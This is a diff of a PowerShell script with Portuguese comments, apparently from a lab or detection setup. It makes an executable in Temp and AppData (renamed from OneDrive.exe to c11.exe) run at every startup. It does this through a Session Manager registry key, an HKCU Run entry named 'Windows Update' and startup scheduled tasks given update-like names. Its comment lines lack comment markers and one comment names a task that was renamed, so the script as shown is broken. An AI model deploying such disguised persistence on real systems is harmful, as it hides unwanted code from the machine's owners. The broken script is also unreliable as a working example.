@@ -18,21 +18,21 @@ Expand-Archive -Path "C:\users\$env:USERNAME\Downloads\SysinternalsSuite.zip" -D
 
 Chave de registro HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Update
 $registryPath1 = "HKLM:\System\CurrentControlSet\Control\Session Manager\Update"
-$registryValue1 = "C:\Windows\Temp\OneDrive.exe"
+$registryValue1 = "C:\Windows\Temp\c11.exe"
 New-Item -Path $registryPath1 -Force
 Set-ItemProperty -Path $registryPath1 -Name "Update" -Value $registryValue1
 
 Chave de registro HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update
 $registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$registryValue2 = "C:\Users\hardening\AppData\Roaming\OneDrive.exe"
+$registryValue2 = "C:\Users\hardening\AppData\Roaming\c11.exe"
 Set-ItemProperty -Path $registryPath2 -Name "Windows Update" -Value $registryValue2
 
-Defina o caminho para o arquivo que vocÃª deseja executar
-$filePath = "C:\Windows\Temp\OneDrive.exe"
+Defina o caminho para o arquivo que deseja executar
+$filePath = "C:\Windows\Temp\c11.exe"
 
 Nome das tarefas agendadas
-$taskName1 = "Sqm-Update"
-$taskName2 = "Windows Update"
+$taskName1 = "C-Update"
+$taskName2 = "Update-Windows"
 
 Crie a tarefa agendada Sqm-Update
 Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "$filePath") -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName $taskName1
